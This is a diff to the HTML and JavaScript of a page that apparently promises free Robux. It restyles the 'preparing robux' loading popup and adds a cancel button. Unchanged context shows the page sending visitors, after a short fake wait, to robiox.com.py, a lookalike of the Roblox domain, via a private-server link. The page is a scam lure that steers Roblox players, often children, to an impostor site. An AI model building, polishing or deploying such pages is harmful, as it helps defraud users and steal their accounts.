@@ -586,35 +586,73 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 1.5rem;
+      gap: 2rem;
       border: 2px solid #ffb347;
       max-width: 400px;
       width: 90%;
     }
 
-    .loading-spinner {
-      width: 60px;
-      height: 60px;
-      border: 4px solid #2f4a6a;
-      border-top: 4px solid #ffb347;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .loading-main-text {
-      color: white;
-      font-size: 1.4rem;
+    .loading-header {
+      color: #ffd966;
+      font-size: 1.5rem;
       font-weight: 600;
+      text-transform: uppercase;
       text-align: center;
-      background: linear-gradient(135deg, #ffffff, #ffb347);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
+      letter-spacing: 1px;
+    }
+
+    .loading-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      background: #0f1a26;
+      border-radius: 60px;
+      padding: 1rem 1.5rem;
+      border: 1px solid #2f4a6a;
+    }
+
+    .loading-item {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .loading-item img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .loading-item span {
+      color: white;
+      font-size: 1.3rem;
+      font-weight: 600;
+    }
+
+    .loading-status {
+      color: #ffb347;
+      font-size: 1.1rem;
+      font-weight: 500;
+    }
+
+    .loading-cancel-btn {
+      background: transparent;
+      border: 2px solid #ffb347;
+      border-radius: 40px;
+      padding: 0.8rem 2.5rem;
+      color: #ffb347;
+      font-weight: 600;
+      font-size: 1rem;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      width: fit-content;
+    }
+
+    .loading-cancel-btn:hover {
+      background: #ffb347;
+      color: #0b0e14;
     }
   </style>
 </head>
@@ -727,9 +765,18 @@
 
   <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-popup">
-      <div class="loading-spinner"></div>
-      <div class="loading-main-text" id="loadingMainText">preparing robux...</div>
-      <div style="color:#8fadc7; font-size:1rem;" id="loadingUsername"></div>
+      <div class="loading-header">Robux Preparation in Progress</div>
+      
+      <div class="loading-content">
+        <div class="loading-item">
+          <img src="robux.png" alt="Robux" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+          <i class="fas fa-coins" style="display: none; color: #ffb347; font-size: 1.8rem;"></i>
+          <span id="loadingRobuxAmount"></span>
+        </div>
+        <div class="loading-status">Waiting...</div>
+      </div>
+
+      <button class="loading-cancel-btn" id="loadingCancelBtn">CANCEL</button>
     </div>
   </div>
 
@@ -842,19 +889,21 @@
         hideConfirmationPopup();
 
         const overlay = document.getElementById('loadingOverlay');
-        const loadingMainText = document.getElementById('loadingMainText');
-        const loadingUsernameSpan = document.getElementById('loadingUsername');
+        const loadingRobuxAmount = document.getElementById('loadingRobuxAmount');
         
-        loadingMainText.innerText = `preparing ${selectedRobux.toLocaleString()} robux...`;
-        if (loadingUsernameSpan) {
-          loadingUsernameSpan.innerText = `@${username}`;
-        }
+        loadingRobuxAmount.textContent = selectedRobux.toLocaleString();
         overlay.classList.add('active');
 
         setTimeout(() => {
           overlay.classList.remove('active');
           window.location.href = 'https://www.robiox.com.py/games/8737602449/PLS-DONATE?privateServerLinkCode=088320015095610633366556564846';
         }, 2500);
+      }
+
+      function cancelLoading() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.classList.remove('active');
+        showNotification('Preparation cancelled');
       }
 
       function goToSlide(newIndex) {
@@ -902,6 +951,8 @@
 
       cancelPopupBtn.addEventListener('click', hideConfirmationPopup);
       confirmPopupBtn.addEventListener('click', processOrder);
+
+      document.getElementById('loadingCancelBtn').addEventListener('click', cancelLoading);
 
       confirmationOverlay.addEventListener('click', (e) => {
         if (e.target === confirmationOverlay) {
